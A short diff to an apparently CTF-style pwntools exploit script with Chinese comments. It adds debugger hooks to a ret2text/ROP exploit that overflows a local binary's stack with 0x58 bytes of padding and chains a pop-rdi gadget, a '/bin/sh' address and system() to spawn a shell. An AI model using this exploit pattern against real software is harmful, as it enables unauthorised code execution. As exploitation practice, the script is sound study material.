@@ -98,7 +98,9 @@ from pwn import *
 context(os='linux',arch='amd64',log_level='debug')
 elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
 io = process("./pwn") #启动一个进程，命名为io
+
 io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
+gdb.attach(io)
 back_door = 0x401235 #ida查找后门地址
 ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
 # payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址4
@@ -106,6 +108,8 @@ ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
 pop_rdi_ret =0x4012c3
 shell_adr = 0x40201A #ida查询
 sys_adr = elf.symbols['system']
+
+pause()
 payload = b's'*0x58 + p64(pop_rdi_ret) + p64(shell_adr) + p64(sys_adr)
 io.sendline(payload) #发生payloa
 io.interactive() #进行交互
